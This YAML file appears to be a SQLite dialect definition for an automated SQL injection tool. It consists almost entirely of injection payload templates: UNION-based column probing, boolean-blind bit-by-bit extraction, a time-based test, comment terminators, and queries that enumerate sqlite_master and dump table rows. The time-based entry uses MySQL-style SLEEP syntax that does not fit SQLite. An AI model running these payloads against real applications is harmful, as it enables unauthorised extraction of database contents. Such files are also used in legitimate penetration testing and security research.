vendor: 
resource: 
 info: |
  select 
      sqlite_version()
      || '${ENCLOSE_VALUE_SQL}'
      || 'sqlite_master'
      || '${ENCLOSE_VALUE_SQL}'
      || 'anonymous'
      || '${TRAIL_SQL}'
      
 schema: 
  database: |
   select 
       '${ENCLOSE_VALUE_SQL}'
       || r
       || '${SEPARATOR_QTE_SQL}'
       || q
       || '${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
   from (
       select 
           'sqlite_master' r, 
           count(*) q 
       from sqlite_master 
       WHERE type = 'table'
   )
   {limit}
   
  table: |
   select 
       group_concat(
           '${ENCLOSE_VALUE_SQL}'
           || name
           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}',
           '${SEPARATOR_CELL_SQL}'
       )
       || '${TRAIL_SQL}'
   from (
       select * 
       from sqlite_master 
       WHERE type = 'table'
       ORDER BY tbl_name
       {limit}
   )
   
  column: |
   select 
       sql
       || '${TRAIL_SQL}'
   from sqlite_master 
   where tbl_name = '${TABLE}'
   and type = 'table'
   {limit}
   
  row: 
   query: |
    select 
        ifnull(
            group_concat(
                '${ENCLOSE_VALUE_SQL}'
                || r
                || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}',
                '${SEPARATOR_CELL_SQL}'
            ),
            ''
        )
        || '${TRAIL_SQL}'
    from (
        select distinct ${FIELDS} r 
        from ${TABLE}
        {limit}
    )
   fields: 
    field: |
     trim(
         ifnull(
             ${FIELD}, 
             ''
         )
     )
    concat: "|| '%7f' ||"
    
strategy: 
 configuration: 
  slidingWindow: |
   (
       select
           '${LEAD}' 
           || substr(
               (${INJECTION}), 
               ${INDEX}, 
               65536
           )
   )
  limit: limit 65536 offset ${LIMIT}
  failsafe: 1337${INDICE}7330%2b1
  calibrator: |
   replace(
       substr(
           quote(
               zeroblob(
                   (65536%2B1) / 2
               )
           ),
           3,
           65536
       ),
       '0',
       '${CALIBRATOR_SQL}'
   )
  limitBoundary: 0
  endingComment: --+-
  fingerprint: 
   errorMessage: 
    - SQLite
    
 normal: 
  indices: union select ${INDICES}
  capacity: (select '${LEAD}${INDICE}' || ${CALIBRATOR})
  orderBy: order by 1337
  
 boolean: 
  test: 
   falses: 
    - 0 = 1
    - 0 %21= 0
    - 0.1 %21= 0.1
    - 1 = 2
    - 1 %21= 1
    - 2 %21= 2
   trues: 
    - 1.2 = 1.2
    - 0.1 = 0.1
    - 0 %21= 1
    - 1 = 1
    - 2 = 2
    - 1 %21= 2
   initialization: 0%2b1 = 1
   bit: |
    unicode(
        substr(
            ${INJECTION}, 
            ${INDEX}, 
            1
        )
    ) 
    %26 ${BIT}
   length: length(${INJECTION}) > ${INDEX}
   
  blind: and ${TEST}
  
  time: |
   and if(
       ${TEST}, 
       1, 
       SLEEP(${SLEEP_TIME})
   )